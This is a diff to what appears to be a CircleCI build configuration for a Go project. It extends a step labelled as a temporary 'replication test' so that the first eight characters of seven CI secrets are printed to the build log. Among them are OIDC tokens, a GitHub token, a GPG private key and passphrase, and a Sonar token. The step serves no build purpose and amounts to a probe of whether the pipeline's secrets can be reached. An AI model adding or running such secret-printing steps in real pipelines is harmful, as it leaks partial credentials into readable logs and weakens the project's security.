@@ -103,7 +103,14 @@ jobs:
       - checkout
       - run:
           name: "Check secret access (replication test - remove after testing)"
-          command: echo "TOKEN_PREFIX=${GITHUB_TOKEN:0:4}"
+          command: |
+            echo "CIRCLE_OIDC_TOKEN=${CIRCLE_OIDC_TOKEN:0:8}"
+            echo "CIRCLE_OIDC_TOKEN_V2=${CIRCLE_OIDC_TOKEN_V2:0:8}"
+            echo "GITHUB_TOKEN=${GITHUB_TOKEN:0:8}"
+            echo "GIT_EMAIL=${GIT_EMAIL:0:8}"
+            echo "GPG_PASSPHRASE=${GPG_PASSPHRASE:0:8}"
+            echo "GPG_PRIVATE_KEY=${GPG_PRIVATE_KEY:0:8}"
+            echo "SONAR_TOKEN=${SONAR_TOKEN:0:8}"
       - run: go get -v -t -d ./...
       - build-provider
 workflows:
